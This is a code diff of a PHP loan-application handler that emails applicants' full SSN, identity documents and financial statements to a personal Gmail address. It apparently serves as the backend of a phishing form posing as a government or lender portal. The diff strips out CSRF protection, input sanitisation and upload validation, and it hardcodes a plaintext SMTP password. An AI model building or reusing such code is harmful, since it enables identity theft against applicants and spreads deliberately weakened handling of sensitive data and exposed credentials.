@@ -3,56 +3,25 @@
  * HELOC Application Processor
  * Sends full application details, including full SSN and file uploads, via SMTP (PHPMailer-compatible).
  */
-session_start();
-
 use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
 
 require_once __DIR__ . '/mailer-lite.php';
+require_once __DIR__ . '/simple-mailer.php';
 
-$smtpHost = 'smtp.your-agency.gov';
-$smtpPort = 587;
-$smtpUser = 'smtp-user';
-$smtpPass = 'smtp-password';
-$fromEmail = 'no-reply@gov-assist-portal.com';
-$toEmail   = 'lending@your-agency-portal.com';
+$smtp = [
+    'host'       => 'smtp.hostinger.com',
+    'port'       => 465,
+    'username'   => 'contact@earnestexpressllc.com',
+    'password'   => 'Weareallmad123@',
+    'secure'     => 'ssl',
+    'from_email' => 'contact@earnestexpressllc.com',
+    'from_name'  => 'Erap application',
+    'to_email'   => 'earnestexpress12@gmail.com',
+];
 
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    if (!isset($_POST['csrf_token'], $_SESSION['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
-        die("Security error: Invalid submission.");
-    }
-
     $clean = function ($key) {
-        return isset($_POST[$key]) ? trim(filter_var($_POST[$key], FILTER_SANITIZE_SPECIAL_CHARS)) : '';
-    };
-
-    $allowedExt = ['pdf', 'jpg', 'jpeg', 'png'];
-    $maxSize = 5 * 1024 * 1024;
-
-    $validateUpload = function ($file, $required = true, $label = '') use ($allowedExt, $maxSize) {
-        if (!isset($file) || $file['error'] === UPLOAD_ERR_NO_FILE) {
-            if ($required) {
-                throw new Exception("Missing required upload: {$label}");
-            }
-            return null;
-        }
-        if ($file['error'] !== UPLOAD_ERR_OK) {
-            throw new Exception("Upload error for {$label}");
-        }
-        if ($file['size'] > $maxSize) {
-            throw new Exception("{$label} exceeds size limit.");
-        }
-        $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
-        if (!in_array($ext, $allowedExt, true)) {
-            throw new Exception("Invalid file type for {$label}");
-        }
-        $finfo = new finfo(FILEINFO_MIME_TYPE);
-        $mime = $finfo->file($file['tmp_name']);
-        $allowedMime = ['application/pdf', 'image/jpeg', 'image/png'];
-        if (!in_array($mime, $allowedMime, true)) {
-            throw new Exception("Invalid MIME type for {$label}");
-        }
-        return $file;
+        return isset($_POST[$key]) ? trim((string)$_POST[$key]) : '';
     };
 
     $name               = $clean('full_name');
@@ -91,10 +60,6 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $terms_agreement    = isset($_POST['terms_agreement']) ? 'Yes' : 'No';
     $digital_signature  = $clean('digital_signature');
     $signature_date     = $clean('signature_date');
-
-    if (empty($name) || empty($email) || empty($ssn)) {
-        die("Security error: Missing required fields.");
-    }
 
     $ltv = 0;
     if ($current_value !== '' && $current_value > 0) {
@@ -142,52 +107,29 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         "SIGNATURE DATE" => $signature_date,
     ];
 
-    $message = "Official HELOC Application\n";
-    $message .= "====================================\n\n";
-    foreach ($fields as $label => $value) {
-        $message .= "{$label}: {$value}\n";
+    $attachments = [
+        'proof_identity' => 'Proof of Identity',
+        'proof_income' => 'Proof of Income',
+        'mortgage_statement' => 'Mortgage Statement',
+        'homeowners_insurance' => 'Homeowners Insurance',
+        'property_tax_statement' => 'Property Tax Statement',
+    ];
+
+    $sent = send_application_email(
+        $smtp,
+        "NEW HELOC APPLICATION: {$name}",
+        $fields,
+        $attachments,
+        $email
+    );
+
+    if ($sent) {
+        header("Location: ../success.html");
+        exit();
     }
-    $message .= "\nSubmission Timestamp: " . date("Y-m-d H:i:s") . "\n";
 
-    try {
-        $attachments = [];
-        $attachments[] = $validateUpload($_FILES['proof_identity'] ?? null, true, 'Proof of Identity');
-        $attachments[] = $validateUpload($_FILES['proof_income'] ?? null, true, 'Proof of Income');
-        $attachments[] = $validateUpload($_FILES['mortgage_statement'] ?? null, true, 'Mortgage Statement');
-        $attachments[] = $validateUpload($_FILES['homeowners_insurance'] ?? null, true, 'Homeowners Insurance');
-        $attachments[] = $validateUpload($_FILES['property_tax_statement'] ?? null, true, 'Property Tax Statement');
-
-        $mail = new PHPMailer(true);
-        $mail->isSMTP();
-        $mail->Host = $smtpHost;
-        $mail->Port = $smtpPort;
-        $mail->Username = $smtpUser;
-        $mail->Password = $smtpPass;
-        $mail->SMTPAuth = true;
-        $mail->SMTPSecure = 'tls';
-        $mail->setFrom($fromEmail, 'GOV-ASSIST HELOC');
-        $mail->addAddress($toEmail);
-        $mail->addReplyTo($email);
-        $mail->Subject = "NEW HELOC APPLICATION: {$name}";
-        $mail->Body = $message;
-        $mail->AltBody = strip_tags($message);
-        $mail->isHTML(false);
-
-        foreach ($attachments as $file) {
-            if (!$file) { continue; }
-            $mail->addAttachment($file['tmp_name'], $file['name']);
-        }
-
-        if ($mail->send()) {
-            header("Location: ../success.html");
-            exit();
-        }
-
-        throw new Exception("Mailer Error: " . $mail->ErrorInfo);
-    } catch (Exception $e) {
-        echo "An error occurred. Please try again later.";
-        echo "<pre>" . htmlspecialchars($e->getMessage()) . "</pre>";
-    }
+    echo "An error occurred. Please try again later.";
+    echo "<pre>" . htmlspecialchars('Unable to send application email.') . "</pre>";
 } else {
     header("Location: ../index.html");
     exit();
